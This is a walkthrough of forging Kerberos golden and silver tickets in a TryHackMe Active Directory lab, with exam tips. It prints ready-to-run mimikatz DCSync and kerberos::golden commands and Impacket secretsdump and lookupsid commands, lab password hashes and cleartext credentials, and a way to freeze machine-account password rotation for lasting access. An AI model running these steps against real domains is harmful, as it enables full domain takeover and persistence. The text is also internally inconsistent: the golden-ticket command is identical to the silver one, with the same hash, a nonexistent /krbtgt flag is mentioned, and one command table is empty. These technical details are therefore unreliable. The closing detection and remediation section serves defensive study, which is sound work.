Persistence Through Tickets: Golden & Silver Ticket Attacks

A command-by-command walkthrough of forging Kerberos TGTs and TGSs for long-term Active Directory persistence, against the za.tryhackme.loc lab forest used in the Persisting Active Directory room — with the exact flags explained and what each one buys you on the OSCP exam.

00

Lab Architecture

The room runs a two-domain forest. THMROOTDC is the forest root (tryhackme.loc), and THMCHILDDC is the DC for the child domain we actually operate in, za.tryhackme.loc. Under the child domain sit two member servers and a workstation — this is where we land first and pivot from.

THMCHILDDC 10.200.73.101 (DC, za.tryhackme.loc) · THMROOTDC 10.200.73.100 (forest root) · THMSERVER1 10.200.73.201 · THMSERVER2 10.200.73.202 · THMWRK1 10.200.73.248 (our foothold)
Why the layout matters

Both attacks below are run from THMWRK1, a low-privilege domain-joined workstation, against THMCHILDDC (the KDC that owns krbtgt) and THMSERVER1 (the member server whose machine account we abuse for the silver ticket). Everything is scoped to the za child domain — a golden ticket forged here is valid child-domain-wide, not forest-wide, unless you additionally abuse the krbtgt-trust/SID-history chain up to the root.

01

Kerberos Recap — Why These Forgeries Work

Golden and silver tickets only make sense once you see which part of the normal exchange each one skips. Normal Kerberos authentication looks like this:

  1. AS-REQ — the user sends the KDC a timestamp encrypted with their NTLM hash, asking for a Ticket Granting Ticket (TGT).
  2. AS-REP — the KDC validates it and returns a TGT. The TGT is signed with the krbtgt account's password hash — a secret that exists only on the DC.
  3. TGS-REQ — the user presents that TGT back to the KDC, asking for a Ticket Granting Service (TGS) ticket for a specific resource.
  4. TGS-REP — the KDC checks the TGT and issues a TGS, encrypted with the NTLM hash of the target service's account (a machine account, or a service account running the SPN).
  5. The user presents that TGS directly to the service, which decrypts it with its own hash and grants access.
The core trick

Whoever holds the secret that signs a ticket can forge that ticket from nothing — no password, no interactive logon, no contact with the real KDC required for the part being forged. Golden tickets forge step 2, using the krbtgt hash to skip straight to "I already have a valid TGT." Silver tickets forge step 4, using a service/machine-account hash to skip straight to "I already have a valid TGS" — the DC is never contacted at all.

02

Golden vs. Silver, At a Glance

🟡 Golden Ticket — forged TGT

  • Signed with the krbtgt hash
  • Valid against any service in the domain (DC must still issue the TGS, but it trusts the forged TGT blindly)
  • Can impersonate disabled / deleted / non-existent users
  • Lifetime, groups and validity are whatever you set in the ticket
  • krbtgt password never rotates by default → persists indefinitely
  • Can be forged on a non-domain-joined box
  • Bypasses smart-card auth entirely

⚪ Silver Ticket — forged TGS

  • Signed with a machine/service account hash
  • Valid only against the one service on one host whose hash you hold
  • DC is never contacted — no TGT exists at all
  • Far fewer logs: nothing on the DC, only on the target host
  • Machine account password rotates ~every 30 days by default
  • Machine accounts behave like normal AD accounts once compromised — useful for further enumeration
03

🟡 Golden Ticket Attack

What you need

RequirementWhyIn this lab
krbtgt NTLM hash (or AES key)Signs the forged TGT — the single thing that makes the DC trust itpulled via DCSync
Domain SIDForged ticket needs a valid domain SID to build a convincing PACS-1-5-21-3885271727-2693558621-2658995185
Domain FQDNTells the KDC which realm the ticket belongs toza.tryhackme.loc
Target username / RIDWho the ticket says you are — real, disabled or entirely fictionalStillNotALegitAccount / RID 500 (built-in Administrator)
Prerequisite access

To reach the krbtgt hash in the first place, you need rights equivalent to Domain Admin (or delegated Replicating Directory Changes All / Replicating Directory Changes permissions) — DCSync is itself a privileged action. The golden ticket's value is persistence after that compromise, not a path to get it.

Attack steps

1

Dump the krbtgt hash with DCSync (from a session with DA rights)

# run inside mimikatz on a host with Domain Admin context
mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /user:ZA\krbtgt
FlagMeaning
lsadump::dcsyncAbuses the MS-DRSR replication protocol to ask a real DC to "replicate" one account's secrets to us, as if we were another DC — no file system or NTDS.dit access needed
/domainFQDN of the domain to replicate from
/userThe single account to pull — scoping to krbtgt keeps the request small and quiet instead of dumping the whole directory
OSCP note

This requires mimikatz running on a Windows box, elevated, with a Domain Admin token (or runas /netonly with DA creds). In the OSCP AD set, you'll usually already be SYSTEM on a DC or holding DA creds by this point — DCSync is the standard way to grab krbtgt without touching ntds.dit on disk, which is noisier and needs VSS.

2

Or pull it remotely from Linux with Impacket (two auth methods)

# pass-the-hash (no cleartext password needed)
impacket-secretsdump 'za.tryhackme.loc/administrator@10.200.73.101' \
  -hashes :aeda8b62fd15a38022aaeffd6757c677 -just-dc-user 'za/krbtgt'

# or with a cleartext password
impacket-secretsdump 'za.tryhackme.loc/administrator:tryhackmewouldnotguess1@10.200.73.101' \
  -just-dc-user 'za/krbtgt'
FlagMeaning
user@targetDomain Admin account and the DC's IP to authenticate against
-hashes :NTLMPass-the-hash: the LM half is left blank (:), only the NTLM hash is supplied — no plaintext password ever touches the wire
-just-dc-userImpacket's equivalent of mimikatz's single-account DCSync — pulls only the named account (za/krbtgt) instead of the full NTDS.dit, which is faster and leaves a smaller replication footprint
OSCP note

This is the path you'll actually use in the exam: Impacket runs from your Kali box, needs no GUI RDP session, and -just-dc-user is far less likely to trip a "mass NTDS replication" alert than a full secretsdump. Memorize this exact syntax — -hashes :NTLM (note the leading colon) is the #1 place people fumble pass-the-hash.

3

Get the domain SID — method 1: whoami /all on a joined box

C:\Users\Administrator.ZA> whoami /all

The user's SID is <domain-SID>-<RID>. Strip the last hyphenated number (the RID, -500 for built-in Administrator) and what's left is the domain SID.

4

Get the domain SID — method 2: impacket-lookupsid (no interactive shell needed)

impacket-lookupsid 'za.tryhackme.loc/administrator@10.200.73.101' -hashes :aeda8b62fd15a38022aaeffd6757c677

# or with a password instead of a hash
impacket-lookupsid 'za.tryhackme.loc/administrator:tryhackmewouldnotguess1@10.200.73.101'
FlagMeaning
lookupsidBrute-forces RIDs over MS-LSAT/SAMR against the target's named pipe to enumerate accounts and print the domain SID directly — no local shell required
OSCP note

Prefer lookupsid or secretsdump's output over RDP-ing in just to run whoami — fewer logged interactive logons, fewer steps, same data. In a time-boxed exam this also means one fewer screenshot to manage.

5

Confirm mimikatz is running — note that local admin is not required

C:\Tools\mimikatz_trunk\x64> mimikatz.exe
mimikatz # privilege::debug
ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061
Why this still works

privilege::debug only matters for operations that touch other processes' memory (like sekurlsa::logonpasswords). Forging and injecting a Kerberos ticket into your own logon session doesn't need SeDebugPrivilege or local admin at all — which is exactly why golden tickets are so dangerous for persistence: any session, even an unprivileged one on a workstation, can mint and use one once you hold the krbtgt hash.

6

Forge the golden ticket and inject it (Pass-the-Ticket)

mimikatz # kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:500 \
  /sid:S-1-5-21-3885271727-2693558621-2658995185 /target:THMSERVER1.za.tryhackme.loc \
  /rc4:4c02d970f7b3da7f8ab6fa4dc77438f4 /service:cifs /ptt
FlagMeaning
kerberos::goldenmimikatz's ticket-forging module — the same command forges both ticket types; which secret you hand /rc4 is what decides which one you get
/adminUsername to put in the forged ticket — doesn't need to exist
/domainDomain FQDN the ticket is issued for
/idRID to impersonate — 500 = built-in Administrator
/sidDomain SID, from steps 3–4
/rc4For a golden ticket this is krbtgt's NTLM hash (/aes128//aes256 are stronger alternatives if you grabbed AES keys too)
/target, /serviceOptional here — when set, mimikatz uses the forged TGT to immediately request a real TGS from the DC for that service and caches both. Omit them to cache only the TGT and let Windows request TGSes on demand as you touch different hosts
/pttPass-the-Ticket — injects the ticket(s) straight into the current logon session's memory instead of writing a .kirbi file to disk
What the signing hash actually buys you

Point /rc4 at the krbtgt hash from Step 1/2 and this is a true golden ticket: mimikatz forges a TGT, and if /target+/service are set it then does a real TGS-REQ against the DC using that forged TGT — the DC trusts it because it's signed with krbtgt, so this still works for any service, not just the one named here. The mimikatz output is identical in shape to the forge command shown in the Silver Ticket section below (PAC generated → PAC signed → EncTicketPart encrypted → "ticket successfully submitted") — only the hash fed to /rc4 differs. If /rc4 is a machine account's hash instead, no krbtgt signature exists, the DC is never contacted at all, and you get a silver ticket good only for that one service on that one host — see Section 04.

OSCP note

Set /startoffset, /endin and /renewmax explicitly if you want a ticket that outlives the default 10-hour policy — that's literally the persistence mechanism: the TGT's own embedded lifetime overrides whatever the KDC's domain policy says, because the KDC never issued it to begin with.

7

Verify and use the ticket

C:\Tools\mimikatz_trunk\x64> klist
C:\Tools\mimikatz_trunk\x64> dir \\thmserver1.za.tryhackme.loc\c$
CommandMeaning
klistNative Windows tool — lists cached Kerberos tickets for the current logon session, confirming the forged ticket is actually loaded
dir \\host\c$Proof of access: an admin-only administrative share, reachable purely because the injected ticket presents as the domain Administrator

The exact klist + dir proof-of-access evidence captured in this lab run is shown once, in the Silver Ticket section's step 3 — the output looks the same regardless of which hash signed the ticket, since from the client side a cached ticket is a cached ticket.

04

⚪ Silver Ticket Attack

What you need

RequirementWhyIn this lab
Target machine/service account NTLM hashSigns the forged TGS — this account is the one that will "verify" itTHMSERVER1$ machine account hash, via secretsdump LSA secrets
Domain SIDSame role as in a golden ticket — needed to build the PAC's group SIDsS-1-5-21-3885271727-2693558621-2658995185
Domain FQDNRealm the forged ticket belongs toza.tryhackme.loc
Target hostname (FQDN)Must match the service's actual SPN or the ticket won't decrypt on that hostTHMSERVER1.za.tryhackme.loc
Service name (SPN class)Which service on that host you're forging access to — e.g. cifs for file shares, http, wsman for WinRM, ldap, hostcifs
Prerequisite access

You need local admin (or equivalent) on the target server itself to extract its machine account hash from LSA secrets — remotely via SAM/LSA dump, or locally via mimikatz. Unlike the golden ticket, this does not require Domain Admin rights anywhere; local admin on one box is enough to persist on that one box.

Attack steps

1

Dump the target server's machine account hash

impacket-secretsdump 'za.tryhackme.loc/administrator@10.200.73.201' -hashes :aeda8b62fd15a38022aaeffd6757c677
FlagMeaning
target IPHere it's pointed at the server itself (10.200.73.201 = THMSERVER1), not the DC — secretsdump starts the Remote Registry service remotely, reads the local SAM and LSA secrets, then stops it
-hashes :NTLMPass-the-hash using the Administrator's hash to get local admin on THMSERVER1 first

Among the local SAM hashes and cached domain logons, LSA Secrets includes $MACHINE.ACC — the server's own computer account credentials, printed as plaintext, NTLM hash, and Kerberos keys.

OSCP note

This is the step people forget exists: a silver ticket's hash doesn't come from DCSync at all — it comes from a local SAM/LSA dump of the box you're already admin on. If you're already local admin on a box via another route (web shell, SeImpersonate abuse, etc.), you don't need to touch the DC to get long-term access to that specific box's services.

2

Forge the silver ticket with the same kerberos::golden command — this time scoped to one host and one service

mimikatz # kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:500 \
  /sid:S-1-5-21-3885271727-2693558621-2658995185 /target:THMSERVER1.za.tryhackme.loc \
  /rc4:4c02d970f7b3da7f8ab6fa4dc77438f4 /service:cifs /ptt
FlagMeaning
kerberos::goldenSame mimikatz module as the golden ticket — what makes this a silver ticket is which key you sign with and the presence of /target + /service, not a different command
/rc4Now the machine account's NTLM hash (THMSERVER1$), not krbtgt's — this is what scopes the forged ticket to one host only
/targetFQDN of the server whose service you're forging a ticket for — must match that host's real name/SPN exactly
/serviceSPN class to target: cifs (SMB/file shares), http (web/WinRM over HTTP), wsman (PowerShell remoting), ldap, host, etc. Each service you want needs its own forged ticket
/pttInjects the forged TGS directly into the current session, same as the golden ticket
Don't confuse this with a golden ticket

Because mimikatz reuses kerberos::golden for both, it's easy to paste a golden-ticket command and forget to swap /krbtgt for the machine hash and add /target + /service. Double check which hash you're signing with — that's the only thing that limits this ticket's blast radius to one host.

3

Verify and use the ticket

C:\Tools\mimikatz_trunk\x64> klist
C:\Tools\mimikatz_trunk\x64> dir \\thmserver1.za.tryhackme.loc\c$

Persisting the silver ticket itself

From the source material

A machine account's password rotates roughly every 30 days by default, which would normally kill this persistence path. Once you have TGS access via the forged ticket, you can reach the host's registry and flip the key that controls machine-account password rotation, freezing the account's password — and therefore this silver ticket's validity — indefinitely.

05

CommandWhat it doesAttack

06

Detection & Cleanup — Why Defenders Hate These

🟡 Golden ticket remediation

  • Fixing it means rotating krbtgt's password — twice, since AD keeps the previous password valid alongside the current one, so a single rotation doesn't actually invalidate anything
  • Every outstanding TGT in the domain becomes invalid the moment this happens — large-scale service disruption is expected, not a sign something went wrong
  • Services that cached a TGT believe it's still good (the embedded timestamp hasn't expired) and won't proactively request a new one, so they just start failing
  • Golden tickets bypass smart-card MFA entirely, since the smart card is only checked at the original AS-REQ step this attack skips

⚪ Silver ticket remediation

  • Rotate the specific machine account's password (Reset-ComputerMachinePassword or disable/re-join)
  • Check whether the attacker froze the 30-day auto-rotation via the registry and re-enable it
  • Far harder to detect: no DC-side 4768/4769 Kerberos event tells you this ticket was forged, because the DC was never involved — hunting has to happen on the target host's own logs
Why blue teams treat these as nuclear

Both attacks are detected after the fact through anomaly hunting (impossible ticket lifetimes, nonexistent usernames, PAC validation mismatches), not through a clean "this ticket is fake" signal — which is exactly why incident response guides default to "rotate krbtgt twice and accept the outage" rather than trying to selectively revoke.
